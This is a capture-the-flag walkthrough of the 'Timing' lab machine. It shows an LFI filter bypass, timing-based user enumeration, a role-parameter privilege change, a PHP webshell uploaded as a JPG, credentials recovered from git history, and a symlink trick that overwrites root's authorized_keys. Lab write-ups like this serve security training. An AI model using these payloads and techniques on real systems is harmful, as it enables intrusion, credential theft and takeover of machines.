# Timing

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.71.202
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-11 01:29 EDT
Nmap scan report for 10.129.71.202
Host is up (0.016s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### Web Enum --> LFI

Port 80 reveals a basic web page:

<figure><img src="../../../.gitbook/assets/image (4) (3) (4).png" alt=""><figcaption></figcaption></figure>

We can fuzz for directories using `gobuster`.&#x20;

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.129.71.202 -x php,html,txt
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.71.202
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
2023/05/11 01:43:13 Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/.html                (Status: 403) [Size: 278]
/index.php            (Status: 302) [Size: 0] [--> ./login.php]
/images               (Status: 301) [Size: 315] [--> http://10.129.71.202/images/]
/login.php            (Status: 200) [Size: 5609]
/profile.php          (Status: 302) [Size: 0] [--> ./login.php]
/image.php            (Status: 200) [Size: 0]
/header.php           (Status: 302) [Size: 0] [--> ./login.php]
```

There's an `image.php` file that we can access, but the Size being 0 means nothing is loaded. When we view the page source, we can see that there are some images loaded:

&#x20;

<figure><img src="../../../.gitbook/assets/image (5) (6).png" alt=""><figcaption></figcaption></figure>

Why would there be an `image.php` file when the images are static on the page itself? When testing, I fuzzed a few parameters, and found that `?img` was the right parameter to use:

<figure><img src="../../../.gitbook/assets/image (3) (4) (4).png" alt=""><figcaption></figcaption></figure>

This looks vulnerable to LFI, but when trying to read it we get blocked:

<figure><img src="../../../.gitbook/assets/image (15) (3) (3).png" alt=""><figcaption></figcaption></figure>

Since this is PHP based, we can try to bypass this using the `php://filter` wrapper, and it works.

```
$ curl http://10.129.71.202/image.php?img=php://filter/convert.base64-encode/resource=/etc/passwd | base64 -d
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2152  100  2152    0     0   112k      0 --:--:-- --:--:-- --:--:--  116k
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
<TRUNCATED>
```

We can create a quick `bash` script to automate this. Anyways, now that we have this, we can read all the files that we fuzzed earlier. Here's the `login.php` file contents:

```php
<?php

include "header.php";

function createTimeChannel()
{
    sleep(1);
}
include "db_conn.php";
if (isset($_SESSION['userid'])){
    header('Location: ./index.php');
    die();
}
if (isset($_GET['login'])) {
    $username = $_POST['user'];
    $password = $_POST['password'];

    $statement = $pdo->prepare("SELECT * FROM users WHERE username = :username");
    $result = $statement->execute(array('username' => $username));
    $user = $statement->fetch();

    if ($user !== false) {
        createTimeChannel();
        if (password_verify($password, $user['password'])) {
            $_SESSION['userid'] = $user['id'];
            $_SESSION['role'] = $user['role'];
            header('Location: ./index.php');
            return;
        }
    }
    $errorMessage = "Invalid username or password entered";
}
?>
```

There's a `db_conn.php` file present.&#x20;

```php
$ ./lfi.sh /var/www/html/db_conn.php
<?php
$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', '4_V3Ry_l0000n9_p422w0rd');
```

But with this password, we can't really do anyhting because we don't have a user that we can use. We can also read the `image.php` file itself:

```php
<?php

function is_safe_include($text)
{
    $blacklist = array("php://input", "phar://", "zip://", "ftp://", "file://", "http://", "data://", "expect://", "https://", "../");

    foreach ($blacklist as $item) {
        if (strpos($text, $item) !== false) {
            return false;
        }
    }
    return substr($text, 0, 1) !== "/";

}

if (isset($_GET['img'])) {
    if (is_safe_include($_GET['img'])) {
        include($_GET['img']);
    } else {
        echo "Hacking attempt detected!";
    }
}

```

This uses `include`, which means it can execute PHP code if any file is included using that. This will be important later.

### Timing Attack

There was a weird function called `createTimeChannel()` within the `login.php` file, and all it does is `sleep(1)`. This function only executes on a valid user, so we can use this to fuzz for users and check which time is the shortest.

For example, we can compare between a fake user 'test', and a real user 'admin':

```
$ time curl -X POST http://10.129.71.202/login.php?login=true -d 'user=test&password=test' > /dev/null                   
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  5986  100  5963  100    23   234k    927 --:--:-- --:--:-- --:--:--  233k

real    0.03s
user    0.01s
sys     0.00s
cpu     19%

$ time curl -X POST http://10.129.71.202/login.php?login=true -d 'user=admin&password=test' > /dev/null
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  5987  100  5963  100    24   5257     21  0:00:01  0:00:01 --:--:--  5279

real    1.14s
user    0.00s
sys     0.01s
cpu     0%
```

Using this, we can brute force the users out. Since we have the `/etc/passwd` file, we can find that `aaron` is a user with a shell:

```
aaron:x:1000:1000:aaron:/home/aaron:/bin/bash
```

Doing the same test, we can see the request with `aaron` as the username takes more than 1s.

```
$ time curl -X POST http://10.129.71.202/login.php?login=true -d 'user=aaron&password=test' > /dev/null
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  5987  100  5963  100    24   5294     21  0:00:01  0:00:01 --:--:--  5317

real    1.13s
user    0.00s
sys     0.00s
cpu     0%
```

Using `aaron:aaron`, we can login!

<figure><img src="../../../.gitbook/assets/image (6) (4) (2).png" alt=""><figcaption></figcaption></figure>

### Broken Access Control

When update our profile, we cansee that it returns some parameters:

<figure><img src="../../../.gitbook/assets/image (13) (5).png" alt=""><figcaption></figcaption></figure>

If we append `role=1` to the end of the POST parameters, it would actually change the response:

<figure><img src="../../../.gitbook/assets/image (2) (4) (4).png" alt=""><figcaption></figcaption></figure>

Upon reloading the page, we can see an Admin Panel:

<figure><img src="../../../.gitbook/assets/image (457).png" alt=""><figcaption></figcaption></figure>

This would load `avatar_uploader.php`, which we can definitely read the source code for. Also, sending any files here would send a POST request to `upload.php`.

### File Upload Exploit

Since we have the LFI, let's read the source code for `upload.php`.

```php
<?php
include("admin_auth_check.php");

$upload_dir = "images/uploads/";

if (!file_exists($upload_dir)) {
    mkdir($upload_dir, 0777, true);
}

$file_hash = uniqid();

$file_name = md5('$file_hash' . time()) . '_' . basename($_FILES["fileToUpload"]["name"]);
$target_file = $upload_dir . $file_name;
$error = "";
$imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));

if (isset($_POST["submit"])) {
    $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);
    if ($check === false) {
        $error = "Invalid file";
    }
}

// Check if file already exists
if (file_exists($target_file)) {
    $error = "Sorry, file already exists.";
}

if ($imageFileType != "jpg") {
    $error = "This extension is not allowed.";
}

if (empty($error)) {
    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
        echo "The file has been uploaded.";
    } else {
        echo "Error: There was an error uploading your file.";
    }
} else {
    echo "Error: " . $error;
}
?>
```

It appears there's a check for the type of file uploaded, and that the name of the file is being checked. The filename + `time()` is hashed, and then it is prepended to `_<NAME>.jpg`. Knowing this, let's try to upload a `.jpg` file with that contains a PHP webshell. The PHP code will be executed by `image.php` which uses `includes`.&#x20;

We can first upload a JPG file that has the webshell:

```http
POST /upload.php HTTP/1.1
Host: 10.129.71.202
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------26481396435153909171938555394
Content-Length: 266
Origin: http://10.129.71.202
Connection: close
Referer: http://10.129.71.202/avatar_uploader.php
Cookie: PHPSESSID=2ajm7fqv45h7v26oj6uft18j5i



-----------------------------26481396435153909171938555394
Content-Disposition: form-data; name="fileToUpload"; filename="cmd.jpg"
Content-Type: application/x-php

<?php system($_REQUEST['cmd']); ?>
-----------------------------26481396435153909171938555394--
```

Then, we can simply take note of the time it was uploaded.

{% embed url="https://www.epochconverter.com/" %}

In this case, mine was `1683786509`. Now, we can calculate where the file is.&#x20;

```php
php > $time = "Thu, 11 May 2023 06:28:29 GMT";
php > echo md5('$file_hash' . strtotime($time)) . '_' . 'cmd.jpg';
0984bc7fa7f25246092fa7f7963cdba2_cmd.jpg
```

The reason we don't have to consider `$file_hash` as a variable is because in the script, it puts single quotes around it, meaning that the literal string is prepended instead of the output of `uniqid`. We can then get RCE through the LFI on `image.php`.

```
$ curl -d 'cmd=id' http://10.129.71.202/image.php?img=images/uploads/0984bc7fa7f25246092fa7f7963cdba2_cmd.jpg
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Finding Creds

For some reason, I was unable to get a shell at all. I think there's something blocking outgoing connections. Anyways, we can still enumerate the stuff on the machine using this LFI. The `/opt` directory looked interesting, so I downloaded that zip file:

```
$ curl -d 'cmd=ls+-la /opt' http://10.129.71.202/image.php?img=images/uploads/0984bc7fa7f25246092fa7f7963cdba2_cmd.jpg  
total 624
drwxr-xr-x  2 root root   4096 Dec  2  2021 .
drwxr-xr-x 24 root root   4096 Nov 29  2021 ..
-rw-r--r--  1 root root 627851 Jul 20  2021 source-files-backup.zip

$ curl -d 'cmd=cat /opt/source-files-backup.zip' http://10.129.71.202/image.php?img=images/uploads/0984bc7fa7f25246092fa7f7963cdba2_cmd.jpg > source.zip
```

When unzipping it, we can see loads of `.git` files:

```
inflating: backup/.git/logs/refs/heads/master  
inflating: backup/.git/logs/HEAD   
inflating: backup/.git/config      
inflating: backup/.git/index 
```

If we view the `git log`, we can see another password that was deleted:

```
$ git log -p -2
commit 16de2698b5b122c93461298eab730d00273bd83e (HEAD -> master)
Author: grumpy <grumpy@localhost.com>
Date:   Tue Jul 20 22:34:13 2021 +0000

    db_conn updated

diff --git a/db_conn.php b/db_conn.php
index f1c9217..5397ffa 100644
--- a/db_conn.php
+++ b/db_conn.php
@@ -1,2 +1,2 @@
 <?php
-$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', 'S3cr3t_unGu3ss4bl3_p422w0Rd');
+$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', '4_V3Ry_l0000n9_p422w0rd');
```

Using that, we can `ssh` in as `aaron`.

<figure><img src="../../../.gitbook/assets/image (439).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Sudo Privileges

When we check `sudo` privileges, we see this:

```
aaron@timing:~$ sudo -l                                                                                             
Matching Defaults entries for aaron on timing:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User aaron may run the following commands on timing:
    (ALL) NOPASSWD: /usr/bin/netutils
```

This was a `bash` script that was running `netutils.jar`.

```
aaron@timing:~$ cat /usr/bin/netutils
#! /bin/bash
java -jar /root/netutils.jar
```

We can't analyse the source code statically, so let's go with dynamic analysis. This thing seems to send requests to download stuff:

```
aron@timing:~$ sudo /usr/bin/netutils
netutils v0.1
Select one option:
[0] FTP
[1] HTTP
[2] Quit
Input >> 1
Enter Url: 10.10.14.13
Initializing download: http://10.10.14.13

$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.71.202 - - [11/May/2023 02:41:56] "GET / HTTP/1.0" 200 -
10.129.71.202 - - [11/May/2023 02:41:56] "GET / HTTP/1.0" 200 -
```

We can use symlinks to abuse this by creating a symlink to overwrite any file since we are running this as `root`. First, create a symlink that points to the `authorized_keys` folder. Then, download our own `public.key` file with my SSH public key in it and it will be downloaded to the `root` SSH directory.

```
aaron@timing:~$ ln -s /root/.ssh/authorized_keys public.key
aaron@timing:~$ sudo /usr/bin/netutils
netutils v0.1
Select one option:
[0] FTP
[1] HTTP
[2] Quit
Input >> 1
Enter Url: http://10.10.14.13/public.key
Initializing download: http://10.10.14.13/public.key
File size: 391 bytes
Opening output file public.key
Server unsupported, starting from scratch with one connection.
Starting download

Downloaded 391 byte in 0 seconds. (3.81 KB/s)
```

This should have overwritten the `authorized_keys` file and we can just `ssh` in as `root`.&#x20;

<figure><img src="../../../.gitbook/assets/image (626).png" alt=""><figcaption></figcaption></figure>
